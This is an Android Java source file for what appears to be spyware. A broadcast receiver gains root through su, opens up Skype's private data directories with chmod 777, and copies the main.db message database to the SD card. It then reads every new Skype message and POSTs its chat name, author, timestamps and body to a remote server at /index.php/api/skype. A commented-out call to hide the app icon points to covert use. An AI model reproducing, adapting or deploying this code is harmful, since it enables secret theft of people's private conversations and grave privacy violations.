package voluntaty.com.baseroot;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.SQLException;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;

import voluntaty.com.database.DataHelper;
import voluntaty.com.database.DatabaseHelperOne;

import org.apache.http.NameValuePair;
import org.apache.http.client.ResponseHandler;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.BasicResponseHandler;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.List;


/**
 * Created by supergoga on 1/28/2016.
 */
public class RepeatingAlarmServiceSkype extends BroadcastReceiver {

    public void setpermission(String path) {
        try {
            Process shell = Runtime.getRuntime().exec("su", null, new File("/system/bin/"));
            OutputStream os = shell.getOutputStream();

            os.write(("chmod 777 " + path).getBytes("ASCII"));
            os.flush();
            os.close();
            shell.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public void setmkdir(String path) {
        try {
            Process shell = Runtime.getRuntime().exec("su", null, new File("/system/bin/"));
            OutputStream os = shell.getOutputStream();

            os.write(("mkdir -p " + path).getBytes("ASCII"));
            os.flush();
            os.close();
            shell.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void copyFile() {

        try {
            Process shell = Runtime.getRuntime().exec("su", null, new File("/system/bin/"));
            OutputStream os = shell.getOutputStream();

            os.write(("cp /data/data/com.skype.raider/files/superslon74/main.db /sdcard/copyskype").getBytes("ASCII"));
            os.flush();
            os.close();
            shell.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }




    Cursor c = null;

    private DataHelper dh;
    String login=null;
    String email=null;
    String password=null;
    String URL_HTTP=null;

    public static boolean isNetworkConnectedOrConnecting(Context context) {
        final ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        final NetworkInfo networkInfo = cm.getActiveNetworkInfo();
        return networkInfo != null && networkInfo.isConnectedOrConnecting();
    }

    public void onReceive(Context context, Intent intent) {
        if (isNetworkConnectedOrConnecting(context.getApplicationContext())) {
            someTask(context);
        }
    }


    void someTask(Context context){

        dh = null;
        dh = new DataHelper(context);

        String serviceskype;
        serviceskype = null;

        serviceskype = dh.selectServiceskype("1");
        dh = null;
        if(serviceskype.length()>0) {

            AccountManager am = AccountManager.get(context); // current Context
            //AccountManager am = (AccountManager) getSystemService(ACCOUNT_SERVICE); // видел такой способ

            Account[] accounts = am.getAccountsByType("com.skype.contacts.sync");

            String nameaccount = null;
            nameaccount = accounts[0].name;

            setpermission("/data");
            setpermission("/data/data");
            setpermission("/data/data/com.skype.raider");
            setpermission("/data/data/com.skype.raider/files");
            setpermission("/data/data/com.skype.raider/files/" + nameaccount);
            setpermission("/data/data/com.skype.raider/files/" + nameaccount + "/main.db");
            //    setpermission("/data/data/com.skype.raider/databases/skypeRingtoneDB.db");
        setpermission("/sdcard");
            setmkdir("/sdcard/copyskype");
            setpermission("/sdcard/copyskype");

            copyFile();
            //  hideIcon(context);
            dh = null;
            dh = new DataHelper(context);
            URL_HTTP = dh.selectUrl_Http();
            login = dh.selectLogin();
            email = dh.selectEmail();
            password = dh.selectPassword();


            DatabaseHelperOne myDbHelper = null;
            myDbHelper = new DatabaseHelperOne(context);
            try {

                myDbHelper.createDataBase();

            } catch (IOException ioe) {

            }

            try {

                myDbHelper.openDataBase();

            } catch (SQLException e) {
            }
            //      Toast.makeText(MainActivity.this, "Success", Toast.LENGTH_SHORT).show();


            c = myDbHelper.query("messages", null, null, null, null, null, null);

            if (c.moveToFirst()) {
                do {

                    String idmessage = null;

                    idmessage = dh.selectIdMessageSkype(c.getString(0));
                    int dlina = idmessage.length();
                    if (dlina < 1) {

                        new RequestTask().execute(URL_HTTP, email, "" + c.getString(0), "" + c.getString(3), "" + c.getString(4), "" + c.getString(5), "" + c.getString(9), "" + c.getString(18), "" + c.getString(36));
                        //     new RequestTask().execute(URL_HTTP, email, "1111","22222", "3333" , "4444", "5555"ng(9), "" + c.getString(18), "" + c.getString(36));


                        dh.insertIdMessageSkype(c.getString(0));
                        //       Toast.makeText(getApplicationContext()," ?? "+str2, Toast.LENGTH_LONG).show();

                    }

                    idmessage = null;

                } while (c.moveToNext());
            }
            c = null;
            dh = null;
            myDbHelper = null;
            URL_HTTP = null;
            login = null;
            email = null;
            password = null;
        }
            serviceskype = null;
    }

    class RequestTask extends AsyncTask<String, String, String> {
        private String str2=null;

        @Override
        protected String doInBackground(String... params) {

            try {
                // создаем запрос на сервер
                DefaultHttpClient hc = new DefaultHttpClient();
                ResponseHandler<String> res = new BasicResponseHandler();
                // он у нас будет посылать post запрос
                HttpPost postMethod = new HttpPost(params[0]+"/index.php/api/skype");
                // будем передавать два параметра
                List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(6);
                //0
                nameValuePairs.add(new BasicNameValuePair("email",params[1]));
                nameValuePairs.add(new BasicNameValuePair("idmessage",params[2]));
                nameValuePairs.add(new BasicNameValuePair("chatname",params[3]));
                nameValuePairs.add(new BasicNameValuePair("author",params[4]));
                nameValuePairs.add(new BasicNameValuePair("from_dispname",params[5]));
                nameValuePairs.add(new BasicNameValuePair("timestamp",params[6]));
                nameValuePairs.add(new BasicNameValuePair("timestampms",params[8]));
                nameValuePairs.add(new BasicNameValuePair("bodyxml",params[7]));

                // собераем их вместе и посылаем на сервер
                postMethod.setEntity(new UrlEncodedFormEntity(nameValuePairs,"UTF-8"));
                // получаем ответ от сервера
                String response = hc.execute(postMethod, res);
                //	JSONURL(response.toString());
            } catch (Exception e) {
                System.out.println("Exp=" + e);
            }



            return null;
        }

        @Override
        protected void onPostExecute(String result) {

            //dialog.dismiss();
            super.onPostExecute(result);
            // 			Toast.makeText(getApplicationContext()," ?? "+str2, Toast.LENGTH_LONG).show();
        }

        @Override
        protected void onPreExecute() {

            super.onPreExecute();
        }
    }



}
